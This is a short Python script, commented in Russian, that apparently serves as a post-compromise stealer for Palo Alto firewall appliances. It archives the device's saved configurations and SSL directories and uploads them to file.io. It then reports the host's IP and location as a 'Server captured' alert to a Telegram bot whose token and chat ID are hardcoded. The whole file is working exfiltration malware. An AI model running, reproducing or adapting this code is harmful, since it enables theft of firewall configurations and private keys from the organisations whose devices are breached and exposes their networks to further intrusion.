import subprocess
import importlib
import sys
import hashlib
import os
import io
import tarfile
import requests

# Устанавливаем необходимые библиотеки
def install_package(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

def check_and_install_libraries():
    required_libraries = ["requests", "urllib3"]
    for lib in required_libraries:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"Library {lib} not found, installing...")
            install_package(lib)

check_and_install_libraries()

# Отключаем предупреждения
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Конфигурация для Telegram
tg_bot_token = '7330744500:AAHe_rHmqnh3Xcb7ZTieL22OoxWBHV7XFqc'  # Ваш API токен
tg_chat_id = '-1002403648422'  # Ваш чат ID

# Функция для загрузки файла на File.io
def upload_to_fileio(file_data, file_name):
    url = "https://file.io"
    files = {
        'file': (file_name, file_data)
    }
    response = requests.post(url, files=files)
    if response.status_code == 200:
        data = response.json()
        return data.get("link", None)
    return None

# Функция для отправки сообщения в Telegram
def send_to_telegram(message, files):
    url = f"https://api.telegram.org/bot{tg_bot_token}/sendMessage"
    
    # Готовим ссылки на файлы
    file_links = ""
    for file_name, file_data in files.items():
        link = upload_to_fileio(file_data, file_name)
        if link:
            file_links += f"Файл: {file_name}\nСсылка: {link}\n\n"
    
    # Отправляем текстовое сообщение с ссылками
    full_message = message + "\n\n" + file_links
    response = requests.post(url, data={"chat_id": tg_chat_id, "text": full_message})
    if not response.ok:
        print("Error sending message:", response.text)
        return False

    return True

# Функция для архивации директории
def archive_directory(directory_path):
    tar_stream = io.BytesIO()
    with tarfile.open(fileobj=tar_stream, mode="w:gz") as tar:
        tar.add(directory_path, arcname=os.path.basename(directory_path))
    tar_stream.seek(0)
    return tar_stream

# Основная функция
def main():
    try:
        # Получаем информацию о текущем IP
        ip_info = requests.get("http://ip-api.com/json", verify=False).json()
        ip = ip_info["query"]
        country = ip_info["country"]
        city = ip_info["city"]

        ip_hash = hashlib.sha256(ip.encode("utf-8")).hexdigest()

        # Формируем сообщение
        message = f"🟢 Server captured\n"
        message += f"------------------\n"
        message += f"IP: {ip}\n"
        message += f"Country: {country}\n"
        message += f"City: {city}\n"
        message += f"------------------\n"
        message += f"#{ip_hash[:8]}"

        # Архивируем директории
        files = {
            "saved-configs.tar.gz": archive_directory("/opt/pancfg/mgmt/saved-configs"),
            "ssl.tar.gz": archive_directory("/opt/pancfg/mgmt/ssl"),
        }

        # Отправляем в Telegram
        if send_to_telegram(message, files):
            print("Message and file links sent successfully!")
        else:
            print("Error sending message and files.")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
